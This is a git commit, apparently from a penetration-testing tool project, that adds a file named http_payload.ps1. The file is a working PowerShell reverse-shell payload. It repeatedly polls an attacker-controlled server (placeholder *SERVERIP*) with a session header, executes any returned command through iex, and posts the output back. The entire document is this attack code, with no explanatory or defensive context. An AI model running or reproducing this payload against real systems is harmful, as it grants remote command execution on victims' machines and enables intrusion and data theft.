45c3957b916a2d7a18dca481a2d4cc13c5b4c7ad
Panagiotis Chartas <t3l3machus@protonmail.com>
2022-07-10 22:48:19 +0200

    Create http_payload.ps1

---
+++ http_payload.ps1
@@ -0,0 +1,2 @@
+$s='*SERVERIP*';$i='*SESSIONID*';$p='http://';$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/4db6390f840c -Headers @{"X-hoax-id"=$i};while ($true){$c=Invoke-WebRequest -UseBasicParsing -Uri $p$s/c5233a465a7d -Headers @{"X-hoax-id"=$i};
+if ($c.Content -ne 'None') {$r=iex $c.Content -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-WebRequest -Uri $p$s/7f47fd7ae404 -Method POST -Headers @{"X-hoax-id"=$i} -Body $r$e} sleep *FREQ*}
